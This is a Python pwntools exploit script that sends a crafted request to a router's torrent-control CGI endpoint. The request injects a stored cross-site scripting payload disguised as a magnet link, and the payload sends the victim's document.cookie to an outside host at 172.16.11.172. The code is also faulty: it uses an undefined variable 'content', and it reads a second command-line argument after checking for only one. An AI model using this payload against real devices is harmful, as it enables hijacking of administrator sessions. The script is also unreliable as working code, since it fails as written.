#!/usr/bin/python3

from pwn import *

def form_packet(ip, param):
    packet  = ""
    packet += "GET http://{}/cgi/advanced/torrent_control.cgi?{} HTTP/1.1\r\n".format(ip, param)
    packet += "Host: {}\r\n".format(ip)
    packet += "Connection: keep-alive\r\n"
    packet += "Content-Length: {}\r\n".format(len(content))
    packet += "User-Agent: {}\r\n".format('Mozilla/5.0')
    packet += "Accept: */*\r\n"
    packet += "Origin: http://{}\r\n".format(ip)
    packet += "Referer: http://{}/home.cgi\r\n".format(ip)
    packet += "Accept-Encoding: gzip, deflate\r\n"
    packet += "Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\n"
    packet += "\r\n"
    return packet.encode()

def form_param(payload):
    param = ["act=add_url",
             "url="+payload]
    return "&".join(param)

def payload():
    ret  = 'magnet:?xt=urn:btih:'
    ret += '<img/src="x"/onerror="location.href=\'http://172.16.11.172/?a=\'+document.cookie">'
    ret += '&dn=tr='
    return ret

def exploit(ip, command):

    param  = form_param(payload())
    packet = form_packet(ip, param)

    p = remote(ip, 80)
    p.send(packet)
    r = p.recv().decode()
    log.info(r)
    p.close()

if __name__ == "__main__":
    if (len(sys.argv) != 2):
        print("{} [ip]".format(sys.argv[0]))
    else:
        exploit(sys.argv[1], sys.argv[2])